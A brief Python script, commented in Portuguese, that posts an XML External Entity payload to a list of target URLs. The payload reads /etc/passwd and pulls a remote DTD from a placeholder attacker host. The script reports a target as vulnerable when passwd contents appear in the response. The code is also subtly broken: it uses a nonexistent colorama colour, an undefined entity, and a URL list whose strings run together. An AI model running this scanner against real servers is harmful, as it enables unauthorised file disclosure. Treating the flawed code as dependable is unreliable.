import requests
import xml.etree.ElementTree as ET
from urllib.parse import urlparse
from colorama import init, Fore, Style

# Inicializa colorama para Windows
init()

urls = [
   
    "LISTA OU URL AQUI EXEMPLO --->"
    "https://google.com/",
]

# Crafted XML payload to test for XXE vulnerability
payload = """
<!DOCTYPE replace [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
%remote;
%xxe;
]>
<data>&interestingData;</data>
"""

def detect_xxe(url):
    try:
        response = requests.post(url, data=payload, timeout=10)
        if "root:x" in response.text:
            print(f"{Fore.GREEN}[XXE VULNERABILITY DETECTED]{Style.RESET_ALL} {url}")
        else:
            print(f"{Fore.PURPLE}[No XXE Vulnerability]{Style.RESET_ALL} {url}")
    except Exception as e:
        print(f"{Fore.RED}Error occurred for {url}: {str(e)}{Style.RESET_ALL}")

if __name__ == "__main__":
    for url in urls:
        detect_xxe(url)
